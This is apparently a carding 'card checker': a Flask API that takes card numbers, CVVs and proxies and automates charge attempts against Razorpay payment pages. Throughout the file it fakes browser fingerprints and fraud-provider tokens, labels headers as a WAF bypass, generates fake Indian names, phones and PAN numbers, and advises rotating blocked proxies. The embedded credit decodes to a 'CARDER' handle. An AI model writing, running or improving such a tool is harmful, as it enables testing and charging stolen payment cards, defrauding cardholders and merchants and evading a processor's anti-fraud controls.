from flask import Flask, request, jsonify
import requests, random, string, hashlib, secrets, base64, json, re, time, os, socket
from urllib.parse import urlparse, quote
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
requests.packages.urllib3.disable_warnings()

# ============================================================
# ============== FORCE IPv4 (PROXY COMPATIBILITY) ============
# ============================================================
_original_getaddrinfo = socket.getaddrinfo


def _ipv4_only(host, port, family=0, type=0, proto=0, flags=0):
    return _original_getaddrinfo(host, port, socket.AF_INET, type, proto, flags)


socket.getaddrinfo = _ipv4_only


app = Flask(__name__)
app.json.sort_keys = False

# base64 encoded "@CARDERxRDX"
base = "QENBUkRFUnhSRFg="


def show_base(dev):
    try:
        return base64.b64decode(dev).decode()
    except Exception:
        return dev


@app.route('/health')
@app.route('/healthz')
def health():
    return "", 200


def create_session_with_retries():
    session = requests.Session()
    retry_strategy = Retry(
        total=3,
        connect=3,
        read=3,
        backoff_factor=1.5,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["GET", "POST"],
        raise_on_status=False,
    )
    adapter = HTTPAdapter(max_retries=retry_strategy, pool_maxsize=10)
    session.mount("https://", adapter)
    session.mount("http://", adapter)
    return session


BASE62 = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
first_names = ["Aarav", "Vivaan", "Aditya", "Vihaan", "Arjun", "Sai", "Ishaan", "Rohan", "Karan", "Rahul", "Ravi", "Amit", "Vikram", "Anil", "Sunil", "Rajesh", "Sanjay", "Deepak", "Manoj", "Suresh"]
last_names = ["Sharma", "Patel", "Singh", "Verma", "Gupta", "Reddy", "Kumar", "Joshi", "Mehta", "Nair", "Shah", "Das", "Bose", "Chopra", "Malhotra", "Saxena", "Rao", "Desai", "Pillai", "Menon"]
streets = ["MG Road", "Park Street", "Church Street", "Linking Road", "Banjara Hills", "Civil Lines", "Marine Drive", "Connaught Place", "Sector 62", "Bannerghatta Road", "Lavelle Road", "Sadar Bazaar"]
cities = ["Mumbai", "Delhi", "Bangalore", "Hyderabad", "Chennai", "Kolkata", "Pune", "Ahmedabad", "Jaipur", "Lucknow", "Surat", "Indore"]
pincodes = ["400001", "110001", "560001", "500001", "600001", "700001", "380001", "302001", "226001", "452001", "160001", "800001"]


def rand_phone():
    return "+91" + str(random.choice([6, 7, 8, 9])) + ''.join(str(random.randint(0, 9)) for _ in range(9))


def rand_name():
    return random.choice(first_names) + " " + random.choice(last_names)


def rand_email(n):
    return n.lower().replace(" ", ".") + str(random.randint(1, 99)) + "@gmail.com"


def rand_address():
    i = random.randint(0, len(cities) - 1)
    return f"{random.randint(1, 999)} {random.choice(streets)}, {cities[i]}- {pincodes[i]}"


def rand_pan():
    return ''.join(random.choices(string.ascii_uppercase, k=5)) + ''.join(random.choices(string.digits, k=4)) + random.choice(string.ascii_uppercase)


def parse_proxy(p):
    if not p:
        return None
    p = p.strip()
    scheme = "http"
    if '://' in p:
        s = p.split('://')
        if s[0].lower() in ("http", "https", "socks4", "socks5"):
            scheme = s[0].lower()
            p = s[1]
    body = p
    if '@' in body:
        auth, host = body.rsplit('@', 1)
        user, _, pwd = auth.partition(':')
        body = f"{user}:{pwd}@{host}"
    elif body.count(':') == 3:
        ip, port, user, pwd = body.split(':')
        body = f"{user}:{pwd}@{ip}:{port}"
    url = f"{scheme}://{body}"
    return {"http": url, "https": url}


def check_site(site_url, proxy=None, cc=None):
    parts = cc.split("|")
    cc_num, mm, yy, cvv = parts[0], parts[1].zfill(2), parts[2][-2:], parts[3]

    name = rand_name()
    phone = rand_phone()
    email = rand_email(name)
    address = rand_address()
    pan = rand_pan()
    h = hashlib.sha1(secrets.token_bytes(16)).hexdigest()
    ts = str(int(time.time() * 1000))
    rnd = str(random.randrange(10**8)).zfill(8)
    rzp_device_id = f"1.{h}.{ts}.{rnd}"
    rzp_unified_session_id = ''.join(secrets.choice(BASE62) for _ in range(14))
    page_origin = urlparse(site_url).scheme + "://" + (urlparse(site_url).hostname or "pages.razorpay.com")

    session = create_session_with_retries()
    session.trust_env = False
    if proxy:
        session.proxies.update(proxy)

    # ===== PROXY HEALTH PROBE (fail fast, 2-3s) =====
    try:
        probe = session.get("https://api.ipify.org?format=json", verify=False, timeout=8)
        if probe.status_code != 200:
            return "PROXY_DEAD: probe non-200"
    except requests.exceptions.ConnectionError as e:
        return f"PROXY_DEAD: {str(e)[:60]}"
    except requests.exceptions.Timeout:
        return "PROXY_DEAD: timeout"
    except Exception as e:
        return f"PROXY_DEAD: {str(e)[:60]}"

    # ===== BUILD EXTRACTION =====
    try:
        js = session.get("https://checkout.razorpay.com/v1/checkout.js", verify=False, timeout=15).text
        BUILD = (m.group(1) if (m := re.search(r'g="([a-f0-9]{40})"', js)) else "afa3662e035e66c495f2ddc21c6f030530870f53")
        BUILD_V1 = (m.group(1) if (m := re.search(r'build_v1:"([a-f0-9]{40})"', js)) else "da4ee3f43a28ad81dba8ed06daf899a4520c691f")
    except:
        BUILD = "afa3662e035e66c495f2ddc21c6f030530870f53"
        BUILD_V1 = "da4ee3f43a28ad81dba8ed06daf899a4520c691f"

    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"

    # ============================================================
    # ===== FULL BROWSER HEADERS (WAF BYPASS) ====================
    # ============================================================
    page_headers = {
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "sec-ch-ua": '"Not;A=Brand";v="8", "Chromium";v="150", "Brave";v="150"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Cache-Control": "max-age=0",
        "Connection": "keep-alive",
    }

    # ===== PAGE LOAD =====
    try:
        r = session.get(site_url, verify=False, timeout=30, headers=page_headers)
    except requests.exceptions.ConnectionError as e:
        return f"NETWORK_ERROR: page load ({str(e)[:60]})"
    except requests.exceptions.Timeout:
        return "NETWORK_ERROR: page load timeout"
    except Exception as e:
        return f"NETWORK_ERROR: page load ({str(e)[:60]})"

    # ===== 403 WAF DETECTION =====
    if r.status_code == 403:
        return "WAF_403: Proxy blocked by Razorpay (use residential Indian proxy)"
    if r.status_code == 429:
        return "RATE_LIMITED: Razorpay throttled this proxy (rotate proxy)"
    if r.status_code != 200:
        return f"HTTP_{r.status_code}: page load failed"

    m = re.search(r'var data = ({.*?});', r.text, re.DOTALL)
    if not m:
        return "PAGE_DATA_NOT_FOUND: Razorpay page structure changed or proxy redirected"
    init_data = json.loads(m.group(1))
    if "error_code" in init_data:
        return str(init_data.get("message", "page error"))[:200]
    kyid = init_data["key_id"]
    plink = init_data["payment_link"]["id"]
    ppid = init_data["payment_link"]["payment_page_items"][0]["id"]
    klh = init_data.get("keyless_header", "")
    klh_url = quote(klh.encode('utf-8'), safe='')
    try:
        item_amt = init_data["payment_link"]["payment_page_items"][0].get("item", {}).get("amount")
        amo = int(item_amt) if item_amt else int(init_data["payment_link"].get("min_amount_value", 100))
    except:
        amo = 100
    if amo < 1:
        amo = 100

    session.cookies.set("_rzp_unified_session_id", rzp_unified_session_id, domain=".razorpay.com")

    h_order = {
        "Accept": "application/json, text/plain, */*", "Content-Type": "application/json",
        "Origin": page_origin, "Referer": page_origin + "/", "User-Agent": ua,
        "Accept-Language": "en-US,en;q=0.9",
        "sec-ch-ua": '"Not;A=Brand";v="8", "Chromium";v="150", "Brave";v="150"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
    }

    # ===== ORDER CREATE =====
    try:
        resp_o = session.post(
            f"https://api.razorpay.com/v1/payment_pages/{plink}/order",
            headers=h_order,
            json={"notes": {"comment": "", "name": name}, "line_items": [{"payment_page_item_id": ppid, "amount": amo}]},
            verify=False, timeout=30
        )
    except requests.exceptions.ConnectionError as e:
        return f"NETWORK_ERROR: order create ({str(e)[:60]})"
    except requests.exceptions.Timeout:
        return "NETWORK_ERROR: order create timeout"
    except Exception as e:
        return f"NETWORK_ERROR: order create ({str(e)[:60]})"

    if resp_o.status_code == 403:
        return "WAF_403: Order create blocked (proxy burned, rotate)"
    if resp_o.status_code == 429:
        return "RATE_LIMITED: Order create throttled (rotate proxy)"

    try:
        od = json.loads(resp_o.text)
        if "error" in od:
            return str(od["error"].get("description", "order failed"))[:200]
        order_id = od["order"]["id"]
        checkout_id = order_id.split("_")[1]
    except:
        return f"HTTP {resp_o.status_code}"

    h_pub = {
        "Accept": "text/html,*/*", "Referer": page_origin + "/", "User-Agent": ua,
        "Accept-Language": "en-US,en;q=0.9",
        "sec-ch-ua": '"Not;A=Brand";v="8", "Chromium";v="150", "Brave";v="150"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
    }
    params_pub = {
        "traffic_env": "canary", "build": BUILD, "build_v1": BUILD_V1,
        "checkout_v2": "1", "new_session": "1", "keyless_header": klh,
        "rzp_device_id": rzp_device_id, "unified_session_id": rzp_unified_session_id,
    }

    # ===== PUBLIC SESSION =====
    try:
        r_pub = session.get("https://api.razorpay.com/v1/checkout/public", params=params_pub, headers=h_pub, verify=False, timeout=30)
    except requests.exceptions.ConnectionError as e:
        return f"NETWORK_ERROR: public session ({str(e)[:60]})"
    except requests.exceptions.Timeout:
        return "NETWORK_ERROR: public session timeout"
    except Exception as e:
        return f"NETWORK_ERROR: public session ({str(e)[:60]})"

    if r_pub.status_code == 403:
        return "WAF_403: Public session blocked (proxy burned)"
    if r_pub.status_code == 429:
        return "RATE_LIMITED: Public session throttled"

    sessid = (m.group(1) if (m := re.search(r'window.session_token="([^"]+)"', r_pub.text)) else "")
    if not sessid:
        m = re.search(r'session_token["\']?\s*[:=]\s*["\']([A-F0-9]{40,})["\']', r_pub.text)
        if m:
            sessid = m.group(1)
    if not sessid:
        return "SESSION_TOKEN_NOT_FOUND: Razorpay ne session nahi diya"

    h_pref = {
        "Accept": "*/*", "Content-type": "application/json", "Origin": "https://api.razorpay.com",
        "Referer": f"https://api.razorpay.com/v1/checkout/public?traffic_env=canary&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&unified_session_id={rzp_unified_session_id}&session_token={sessid}",
        "User-Agent": ua, "x-session-token": sessid,
    }

    # ===== PREFERENCES (fire and forget) =====
    try:
        session.post(
            "https://api.razorpay.com/v2/standard_checkout/preferences",
            params={"x_entity_id": order_id, "session_token": sessid, "keyless_header": klh},
            headers=h_pref, data=json.dumps({"identifiers": {}, "action": "get"}),
            verify=False, timeout=30
        )
    except Exception:
        pass

    h_co = {
        "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded", "Origin": "https://api.razorpay.com",
        "Referer": f"https://api.razorpay.com/v1/checkout/public?traffic_env=canary&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&unified_session_id={rzp_unified_session_id}&session_token={sessid}",
        "User-Agent": ua, "x-session-token": sessid,
        "Accept-Language": "en-US,en;q=0.9",
        "sec-ch-ua": '"Not;A=Brand";v="8", "Chromium";v="150", "Brave";v="150"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
    }
    params_co = {"key_id": kyid, "session_token": sessid, "keyless_header": klh}
    data_co = {
        "notes[email]": email, "notes[phone]": phone[3:], "payment_link_id": plink,
        "key_id": kyid, "contact": phone, "email": email, "currency": "INR",
        "_[integration]": "payment_pages", "_[device.id]": rzp_device_id,
        "_[library]": "checkoutjs", "_[library_src]": "no-src", "_[current_script_src]": "no-src",
        "_[platform]": "browser", "_[env]": "", "_[is_magic_script]": "false", "_[os]": "windows",
        "_[shield][fhash]": h, "_[shield][tz]": "330", "_[device_id]": rzp_device_id,
        "_[build]": BUILD, "_[shield][os]": "windows", "_[shield][platform]": "browser",
        "_[shield][browser]": "chrome", "_[request_index]": "0", "amount": amo,
        "order_id": order_id, "method": "card", "checkout_id": checkout_id,
    }

    # ===== CHECKOUT ORDER =====
    try:
        r_co = session.post("https://api.razorpay.com/v1/standard_checkout/checkout/order", params=params_co, headers=h_co, data=data_co, verify=False, timeout=30)
    except requests.exceptions.ConnectionError as e:
        return f"NETWORK_ERROR: checkout order ({str(e)[:60]})"
    except requests.exceptions.Timeout:
        return "NETWORK_ERROR: checkout order timeout"
    except Exception as e:
        return f"NETWORK_ERROR: checkout order ({str(e)[:60]})"

    if r_co.status_code == 403:
        return "WAF_403: Checkout order blocked (proxy burned)"
    if r_co.status_code == 429:
        return "RATE_LIMITED: Checkout order throttled"

    try:
        coid_local = json.loads(r_co.text).get("checkout_id", checkout_id)
    except:
        coid_local = checkout_id

    h_cb = {
        "Accept": "*/*", "Content-type": "application/json", "User-Agent": ua, "x-session-token": sessid,
        "Origin": "https://api.razorpay.com",
        "Referer": f"https://api.razorpay.com/v1/checkout/public?traffic_env=canary&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&unified_session_id={rzp_unified_session_id}&session_token={sessid}",
    }
    payload_cb = {
        "identifiers": {"merchant": {"country": "IN"}, "card": {"country": "US", "dcc_blacklist": False, "network": "visa"}, "method": "card", "payment_currency": "INR"},
        "forex_charges": {"amount": amo, "currency": "INR", "filters": {"method": "card"}}
    }

    # ===== CB FLOWS (fire and forget) =====
    try:
        session.post(f"https://api.razorpay.com/payments_cross_border_live/v1/checkout/cb_flows?x_entity_id={order_id}&keyless_header={klh_url}", headers=h_cb, json=payload_cb, verify=False, timeout=30)
    except Exception:
        pass

    token_create = base64.b64encode(json.dumps([
        {"name": "sardine", "metadata": {"session_id": coid_local}},
        {"name": "stripe_radar", "metadata": {"session_id": "rse_" + ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(22))}}
    ], separators=(',', ':')).encode()).decode()

    h_create = {
        "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded", "Origin": "https://api.razorpay.com",
        "Referer": f"https://api.razorpay.com/v1/checkout/public?traffic_env=canary&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&unified_session_id={rzp_unified_session_id}&session_token={sessid}",
        "User-Agent": ua, "x-session-token": sessid,
        "Accept-Language": "en-US,en;q=0.9",
        "sec-ch-ua": '"Not;A=Brand";v="8", "Chromium";v="150", "Brave";v="150"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
    }
    params_create = {"x_entity_id": order_id, "session_token": sessid, "keyless_header": klh}
    data_create = {
        "user_risk_providers_token": token_create,
        "notes[comment]": "", "notes[email]": email, "notes[phone]": phone[3:],
        "notes[full_name_of_the_donor]": name, "notes[full_address_of_the_donor]": address, "notes[pan_number]": pan,
        "payment_link_id": plink, "key_id": kyid, "contact": phone, "email": email, "currency": "INR",
        "_[integration]": "payment_pages", "_[checkout_id]": coid_local, "_[device.id]": rzp_device_id,
        "_[library]": "checkoutjs", "_[library_src]": "no-src", "_[current_script_src]": "no-src",
        "_[platform]": "browser", "_[env]": "", "_[is_magic_script]": "false", "_[os]": "windows",
        "_[referer]": site_url, "_[shield][fhash]": h, "_[shield][tz]": "330",
        "_[device_id]": rzp_device_id, "_[build]": BUILD, "_[request_index]": "1",
        "amount": amo, "order_id": order_id, "method": "card",
        "card[number]": cc_num, "card[cvv]": cvv, "card[name]": name, "card[expiry_month]": mm, "card[expiry_year]": yy,
        "save": "0",
    }

    # ===== FINAL CHARGE =====
    try:
        r_final = session.post("https://api.razorpay.com/v1/standard_checkout/payments/create/ajax", params=params_create, headers=h_create, data=data_create, verify=False, timeout=30)
    except requests.exceptions.ConnectionError as e:
        return f"NETWORK_ERROR: charge ({str(e)[:60]})"
    except requests.exceptions.Timeout:
        return "NETWORK_ERROR: charge timeout"
    except Exception as e:
        return f"NETWORK_ERROR: charge ({str(e)[:60]})"

    if r_final.status_code == 403:
        return "WAF_403: Charge blocked (proxy burned, rotate)"
    if r_final.status_code == 429:
        return "RATE_LIMITED: Charge throttled (rotate proxy)"

    txt = r_final.text

    try:
        j = json.loads(txt)
        if isinstance(j, dict) and "error" in j:
            desc = str(j["error"].get("description", txt))[:200]
            return desc.split(".")[0] + "."
        if isinstance(j, dict) and "payment_id" in j:
            return f"payment_id: {j['payment_id']} | redirect: {str(j.get('redirect')).lower()}"
    except Exception:
        pass
    return txt[:200]


@app.route("/razorpay", methods=["GET"])
def razorpay():
    site = request.args.get("site", "").strip()
    cc = request.args.get("cc", "").strip()
    proxy_str = request.args.get("proxy", "").strip()

    if not site:
        return jsonify({"CC": cc, "Response": "Site is required", "Site": site, "Time": "0s", "Dev": show_base(base)}), 400
    if not cc:
        return jsonify({"CC": cc, "Response": "CC is required", "Site": site, "Time": "0s", "Dev": show_base(base)}), 400
    if not proxy_str:
        return jsonify({"CC": cc, "Response": "Proxy is required", "Site": site, "Time": "0s", "Dev": show_base(base)}), 400

    proxy = parse_proxy(proxy_str)
    if not proxy:
        return jsonify({"CC": cc, "Response": "Invalid proxy format", "Site": site, "Time": "0s", "Dev": show_base(base)}), 400

    start = time.time()
    try:
        msg = check_site(site, proxy, cc)
    except Exception as e:
        msg = f"UNHANDLED: {str(e)[:100]}"
    elapsed = f"{round(time.time() - start, 2)}s"

    return jsonify({
        "CC": cc,
        "Response": msg[:200],
        "Site": site,
        "Time": elapsed,
        "Dev": show_base(base),
    })


if __name__ == "__main__":
    import logging, sys
    try:
        sys.stdout.reconfigure(encoding="utf-8")
    except Exception:
        pass
    logging.getLogger("werkzeug").setLevel(logging.ERROR)
    print("API IS RUNNING...", flush=True)
    port = int(os.environ.get('PORT', 8080))
    from werkzeug.serving import run_simple
    run_simple("0.0.0.0", port, app, threaded=True)
